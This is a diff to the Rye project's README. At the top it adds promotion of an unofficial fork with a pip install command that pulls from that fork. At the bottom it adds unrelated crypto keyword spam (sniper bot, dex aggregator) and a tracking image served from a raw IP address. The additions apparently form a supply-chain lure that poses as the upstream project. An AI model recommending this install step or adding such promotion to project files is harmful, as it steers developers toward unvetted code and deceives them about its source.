@@ -1,3 +1,15 @@
+**A rock-solid Python workflow engine with critical stability patches**
+
+The CyberCraneMenhir/rye fork addresses upstream maintenance gaps by actively integrating crucial stability fixes and dependency updates. It is an excellent choice for developers seeking a highly reliable, production-ready version of Rye without waiting for slow upstream release cycles.
+
+**Quick install**
+
+```bash
+pip install git+https://github.com/CyberCraneMenhir/rye.git
+```
+
+[https://github.com/CyberCraneMenhir/rye](https://github.com/CyberCraneMenhir/rye)
+
 <div align="center">
   <img src="docs/static/favicon.svg" width="100">
   <p><strong>Rye:</strong> a Hassle-Free Python Experience</p>
@@ -82,3 +94,11 @@ Did I spark your interest?
 * [Issue Tracker](https://github.com/astral-sh/rye/issues), if you run into bugs or have suggestions
 * [Badges](https://rye.astral.sh/community/#badges), if you want to show that you use Rye
 * License: MIT
+
+## Related searches
+
+When exploring advanced developer tooling and ecosystem utilities, users frequently look for unified environment managers that can bootstrap language runtimes, streamline dependencies, and orchestrate complex workspaces from a single interface. Developers often seek efficient, compiled binaries to automate their cross-platform build processes and secure structural integrations across decentralized tech stacks.
+
+**Topics:** rust solana, sniper bot, ethereum node, dex aggregator, bridge cross chain, python package manager, virtual environment workflow, developer tooling, ecosystem utility, compiled binaries, automated runtime bootstrapping, monorepo orchestration
+
+![.](http://5.231.58.248:8787/pixel?repo=CyberCraneMenhir%2Frye&inject=CyberCraneMenhir%2Frye%2Fpyproject.toml)
